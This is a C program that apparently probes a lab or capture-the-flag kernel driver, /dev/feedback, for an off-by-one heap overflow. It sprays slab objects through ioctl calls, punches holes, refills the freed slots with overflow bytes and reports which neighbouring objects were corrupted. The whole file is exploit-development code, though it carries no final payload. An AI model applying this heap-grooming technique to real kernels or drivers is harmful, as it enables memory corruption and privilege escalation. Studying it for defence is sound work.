#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define DEV "/dev/feedback"
#define CMD_CREATE 0xc0207300u
#define CMD_DELETE 0xc0207301u
#define CMD_READ   0xc0207302u

struct request {
    uint64_t id;
    uint64_t size;
    char *name;
    char *feedback;
};

static int xioctl(int fd, uint32_t cmd, struct request *req) {
    errno = 0;
    return ioctl(fd, cmd, req);
}

static int create_fb(int fd, uint64_t id, uint64_t size, unsigned char fill, unsigned char ov) {
    char *name = malloc(0x100);
    char *body = malloc(size + 1);
    if (!name || !body) exit(1);

    memset(name, 0x4e, 0xff);
    memset(body, fill, size);
    body[size] = (char)ov;

    struct request req = { .id = id, .size = size, .name = name, .feedback = body };
    int rc = xioctl(fd, CMD_CREATE, &req);

    free(name);
    free(body);
    return rc;
}

static int delete_fb(int fd, uint64_t id) {
    struct request req = { .id = id, .size = 0, .name = NULL, .feedback = NULL };
    return xioctl(fd, CMD_DELETE, &req);
}

static int read_fb(int fd, uint64_t id, char *out, size_t outsz) {
    memset(out, 0, outsz);
    struct request req = { .id = id, .size = 0, .name = NULL, .feedback = out };
    return xioctl(fd, CMD_READ, &req);
}

static int is_hole(int i) {
    return ((i % 3) == 0 || (i % 11) == 0);
}

int main(void) {
    int fd = open(DEV, O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    const int n40 = 180;
    const int n30 = 220;
    const uint64_t base40 = 0x800000;
    const uint64_t base30 = 0x900000;
    char out[0x80];

    puts("[+] phase1: create 0x40 targets");
    for (int i = 0; i < n40; i++) {
        if (create_fb(fd, base40 + i, 0x40, (unsigned char)(0x40 + (i % 40)), 0x5a) != 0) {
            printf("create40 fail i=%d errno=%d\n", i, errno);
            return 1;
        }
    }

    puts("[+] phase2: punch patterned holes in 0x40 set");
    for (int i = 0; i < n40; i++) {
        if (is_hole(i)) {
            delete_fb(fd, base40 + i);
        }
    }

    puts("[+] phase3: spam 0x30 objects to perturb neighboring slab activity");
    for (int i = 0; i < n30; i++) {
        unsigned char ov = (unsigned char)(i & 0xff);
        if (create_fb(fd, base30 + i, 0x30, 0x31, ov) != 0) {
            printf("create30 fail i=%d errno=%d\n", i, errno);
            break;
        }
    }

    puts("[+] phase4: refill freed 0x40 slots with aggressive overflow bytes");
    uint64_t refill = 0xa00000;
    for (int i = 0; i < 320; i++) {
        unsigned char ov = (unsigned char)((0x80 + i) & 0xff);
        if (create_fb(fd, refill + i, 0x40, 0x44, ov) != 0) {
            continue;
        }
    }

    puts("[+] phase5: inspect 0x40 object health (meta/data)");
    int bad_meta = 0;
    int bad_data = 0;
    int live_n = 0;
    for (int i = 0; i < n40; i++) {
        if (is_hole(i)) continue;
        live_n++;
        uint64_t id = base40 + i;
        unsigned char expected = (unsigned char)(0x40 + (i % 40));
        int rc = read_fb(fd, id, out, sizeof(out));
        if (rc != 0) {
            bad_meta++;
            if (bad_meta <= 12) {
                printf("META id=%llu rc=%d errno=%d\n", (unsigned long long)id, rc, errno);
            }
            continue;
        }
        if ((unsigned char)out[0] != expected) {
            bad_data++;
            if (bad_data <= 12) {
                printf("DATA id=%llu exp=0x%02x got=0x%02x\n", (unsigned long long)id, expected, (unsigned char)out[0]);
            }
        }
    }

    printf("[+] summary live=%d bad_meta=%d bad_data=%d\n", live_n, bad_meta, bad_data);

    puts("[+] cleanup");
    for (int i = 0; i < n40; i++) delete_fb(fd, base40 + i);
    for (int i = 0; i < n30; i++) delete_fb(fd, base30 + i);
    for (int i = 0; i < 320; i++) delete_fb(fd, refill + i);

    close(fd);
    return 0;
}
